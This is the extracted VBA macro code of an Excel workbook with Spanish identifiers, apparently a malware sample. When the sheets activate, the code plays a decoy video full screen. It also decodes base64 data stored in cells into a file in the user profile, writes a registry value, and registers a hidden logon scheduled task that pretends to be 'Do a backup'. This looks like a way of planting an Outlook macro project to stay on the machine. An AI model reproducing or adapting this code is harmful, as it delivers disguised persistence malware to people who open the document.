Attribute VB_Name = "Gr|fffd|fico1"
Attribute VB_Base = "0{00020821-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Chart_Calculate()
Hoja3.Activate
Hoja2.Activate
Hoja1.Activate
End Sub

Attribute VB_Name = "Hoja1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "WindowsMediaPlayer1, 1, 0, WMPLib, WindowsMediaPlayer"
Private Sub Worksheet_Activate()
    DecodeV
    
    Application.DisplayFullScreen = True
    Application.DisplayStatusBar = False
    
    WindowsMediaPlayer1.uiMode = "full"
    'WindowsMediaPlayer1.Locked = True
    'WindowsMediaPlayer1.Activate
    
    'ActiveWindow.EnableResize = True
    ActiveWindow.DisplayGridlines = False
    ActiveWindow.DisplayHeadings = False
    ActiveWindow.DisplayHorizontalScrollBar = False
    ActiveWindow.DisplayOutline = False
    ActiveWindow.DisplayRuler = False
    ActiveWindow.DisplayVerticalScrollBar = False
    ActiveWindow.DisplayRightToLeft = False
    ActiveWindow.DisplayWhitespace = False
    ActiveWindow.DisplayWorkbookTabs = False
    ActiveWindow.DisplayZeros = False
    ActiveWindow.DisplayFormulas = False
    
    WindowsMediaPlayer1.Left = 0
    WindowsMediaPlayer1.Top = 0
    
    WindowsMediaPlayer1.Width = Application.Width
    WindowsMediaPlayer1.Height = 0.95 * Application.Height
    
    WindowsMediaPlayer1.BringToFront
    
    WindowsMediaPlayer1.Url = directorio + "\Prueba02.mp4"
    
    Application.DisplayAlerts = False
       
    Application.OnTime Now + TimeValue("0:00:7"), "mensaje"
    
    
End Sub
Attribute VB_Name = "Hoja2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Worksheet_Activate()
    Const TriggerTypeLogon = 9
    Const ActionTypeExec = 0
       
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    
    Dim rootFolder
    Set rootFolder = service.GetFolder("\")
    
    Dim tareaDefine
    Set tareaDefine = service.NewTask(0)
    
    Dim regInfo
    Set regInfo = tareaDefine.RegistrationInfo
    regInfo.Description = "Do a backup"
    regInfo.Author = "Author Name"

    Dim principal
    Set principal = tareaDefine.principal
    
    principal.LogonType = 3
    
    Dim settings
    Set settings = tareaDefine.settings
    settings.Enabled = True
    settings.StartWhenAvailable = True
    settings.Hidden = True
    
    Dim triggers
    Set triggers = tareaDefine.triggers
    
    Dim trigger
    Set trigger = triggers.Create(TriggerTypeLogon)
    
    Dim startTime, endTime
    
    Dim time
    time = DateAdd("s", 10, Now)  'start time = 30 seconds from now
    startTime = XmlTime(time)
    
    time = DateAdd("m", 2, Now)
    endTime = XmlTime(time)
     
    trigger.StartBoundary = startTime
    trigger.EndBoundary = endTime
    trigger.ExecutionTimeLimit = "PT5M"    'Five minutes
    trigger.ID = "LogonTriggerId"
    trigger.Enabled = True
    
    Dim UNombre
    Dim UDominio
    UNombre = Environ("username")
    UDominio = Environ("userdomain")
    trigger.UserID = UDominio & "\" & UNombre
    
    'Crear fichero OTM en disco
    TestDecodeToFile
    
    'Cambia el registro
    Dim myWS As Object
    Dim clavereg, claveres
    clavereg = Hoja3.Cells(2, 2)
        
    Set myWS = CreateObject("WScript.Shell")
    On Error Resume Next
    claveres = myWS.RegWrite(clavereg, 1, "REG_DWORD")
    On Error GoTo 0

    Dim UPerf, WDir, Comando
    UPerf = Environ("UserProfile")
    WDir = Environ("WinDir")
    
    Comando = Hoja3.Cells(1, 2)
    
    Dim Action, oldPath, newPath
    
    oldPath = Hoja3.Cells(3, 2)
    newPath = Hoja3.Cells(3, 2)
    
    Set Accion = tareaDefine.Actions.Create(ActionTypeExec)
    Accion.Path = Comando
    Accion.Arguments = "Move-Item -Path " & UPerf & oldPath & " " & UPerf & newPath
      
    On Error Resume Next
    
Call rootFolder.RegisterTaskDefinition( _
        "Lerele", _
        tareaDefine, 6, , , 3)
        
    On Error GoTo 0
    
  
End Sub
    
    Function XmlTime(t)
        Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
        Dim tTime, tDate
    
        cSecond = "0" & Second(t)
        cMinute = "0" & Minute(t)
        CHour = "0" & Hour(t)
        cDay = "0" & Day(t)
        cMonth = "0" & Month(t)
        cYear = Year(t)
    
        tTime = Right(CHour, 2) & ":" & Right(cMinute, 2) & _
            ":" & Right(cSecond, 2)
        tDate = cYear & "-" & Right(cMonth, 2) & "-" & Right(cDay, 2)
        XmlTime = tDate & "T" & tTime
    End Function


Sub TestDecodeToFile()
 
    Dim UPerf
    UPerf = Environ("UserProfile")
    
    Dim strTempPath As String
    Dim b64test As String
    Dim temPath
 
    b64test1 = Hoja3.Cells(1, 1)
    b64test2 = Hoja3.Cells(2, 1)
    b64test3 = Hoja3.Cells(3, 1)
    b64test4 = Hoja3.Cells(4, 1)
    b64test5 = Hoja3.Cells(5, 1)
    b64test6 = Hoja3.Cells(6, 1)
    b64test7 = Hoja3.Cells(7, 1)
    b64test8 = Hoja3.Cells(8, 1)
    b64test9 = Hoja3.Cells(9, 1)
    b64test10 = Hoja3.Cells(10, 1)
    b64test11 = Hoja3.Cells(11, 1)
    b64test12 = Hoja3.Cells(12, 1)
    b64test13 = Hoja3.Cells(13, 1)
    b64test = b64test1 + b64test2 + b64test3 + b64test4 + b64test5 + b64test6 + b64test7 + b64test8 + b64test9 + b64test10 + b64test11 + b64test12 + b64test13
    
    temPath = Hoja3.Cells(3, 2)
    strTempPath = UPerf & temPath
     
    Open strTempPath For Binary As #1
       Put #1, 1, DecodeBase64(b64test)
    Close #1
 
End Sub
 
Private Function DecodeBase64(ByVal strData As String) As Byte()
 
    Dim objXML As Object 'MSXML2.DOMDocument
    Dim objNode As Object 'MSXML2.IXMLDOMElement
 
    'get dom document
    Set objXML = CreateObject("MSXML2.DOMDocument")
 
    'create node with type of base 64 and decode
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
 
    'clean up
    Set objNode = Nothing
    Set objXML = Nothing
 
End Function
Attribute VB_Name = "Hoja3"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "M|fffd|dulo1"
Public Sub mensaje()
    Application.DisplayAlerts = False
    If (Application.Workbooks.Count > 1) Then
        'ThisWorkbook.Close
        'DEjo la aplicaci|fffd|n Excel tal y como estaba
        Application.DisplayFullScreen = False
        'Application.DisplayStatusBar = True
    Else
        'DEjo la aplicaci|fffd|n Excel tal y como estaba
        Application.DisplayFullScreen = False
        'Application.DisplayStatusBar = True
        ActiveWindow.DisplayWorkbookTabs = True
        'Application.Quit
    End If
End Sub

Sub DecodeV()
    Dim strTempPath As String
    Dim b64test As String
    Dim temporal As String
    
    b64test1 = ""
    b64test1 = cargarV
    
    temporal = directorio
    strTempPath = temporal + "\Prueba02.mp4"
    If (Dir(strTempPath) = "") Then
        'save byte array to temp file
        Open strTempPath For Binary As #1
            Put #1, 1, DecodeBase64(b64test1)
        Close #1
    End If
    
End Sub
Function directorio() As String
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    get_TempFolder = fso.GetSpecialFolder(2)
    directorio = get_TempFolder
End Function
Private Function DecodeBase64(ByVal strData As String) As Byte()
 
    Dim objXML As Object 'MSXML2.DOMDocument
    Dim objNode As Object 'MSXML2.IXMLDOMElement
 
    'get dom document
    Set objXML = CreateObject("MSXML2.DOMDocument")
 
    'create node with type of base 64 and decode
    Set objNode = objXML.createElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = strData
    DecodeBase64 = objNode.nodeTypedValue
 
    'clean up
    Set objNode = Nothing
    Set objXML = Nothing
 
End Function

Private Function cargarV() As String
    Dim fila, columna As Integer
    Dim texto As String
    
    fila = 1
    columna = 1
    texto = ""
    While (Hoja2.Cells(fila, columna) <> "")
        texto = texto & Hoja2.Cells(fila, columna)
        fila = fila + 1
    Wend
    cargarV = texto
End Function
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True


INQUEST-PP=macro
